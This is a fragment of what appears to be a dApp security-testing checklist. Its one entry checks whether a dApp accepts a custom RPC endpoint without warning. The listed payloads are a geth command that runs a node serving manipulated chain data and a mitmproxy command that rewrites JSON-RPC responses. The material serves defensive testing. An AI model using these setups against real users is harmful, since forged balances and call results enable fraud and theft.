        how: "Check if the dApp allows configuring a custom RPC endpoint without warning, which could be used to serve manipulated chain data.",
        payloads: [
          "// point the dApp at a malicious RPC that returns a forged eth_call result / fake balance / stale nonce\ngeth --http --http.api eth,net,web3 --networkid 1  # spin up a local node serving manipulated responses",
          "mitmproxy -p 8080 --mode transparent  # intercept and rewrite JSON-RPC responses (eth_call, eth_getBalance) to the dApp",
        ],
        expectedResponse: {
          vulnerable: "The dApp accepts an arbitrary custom RPC URL with no warning, and it silently renders the manipulated balance/eth_call results from the malicious/MITM'd node as if they were trustworthy chain state.",
          safe: "The dApp restricts RPC endpoints to a vetted allowlist (or warns clearly on custom endpoints) and cross-checks critical reads against a trusted source, so manipulated responses are flagged or ignored.",
        },
        severity: "medium",
      },
    ],
  },
];
